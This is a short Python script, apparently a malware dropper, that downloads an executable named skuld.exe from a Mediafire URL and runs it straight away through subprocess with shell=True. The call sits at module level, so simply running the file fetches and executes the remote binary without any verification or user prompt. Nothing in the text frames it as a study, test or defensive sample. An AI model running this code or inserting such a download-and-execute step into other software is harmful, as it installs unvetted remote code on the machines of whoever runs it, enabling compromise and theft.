import requests
import os
import subprocess

def download_and_execute(url):
    # Get the directory of the current script
    script_dir = os.path.dirname(os.path.abspath(__file__))
    # Download the executable file
    r = requests.get(url)
    if r.status_code == 200:
        # Save the downloaded file in the script's directory
        file_path = os.path.join(script_dir, "downloaded_file.exe")
        with open(file_path, "wb") as f:
            f.write(r.content)
        # Execute the downloaded file
        subprocess.Popen(file_path, shell=True)
    else:
        print("Failed to download the file.")

# Example usage
download_and_execute("https://download1588.mediafire.com/9sy2lglqdt6glOcgZUZMn8D29piVqEPAqaNtK5P0o2RMrlSpR94QLUyUk7R2E43QW2aGmgsr9Nc8BvzOQ0Gdcan6Zr8CXwPK20Gm7tVZ0-Hu89HGmWOMIvg19amOSgq0_qO2mzL28zMHaFzr2jAotGEkz4IV3JU52gTRSBqx0xSzC_h-/y4qipdrqawxrvim/skuld.exe")
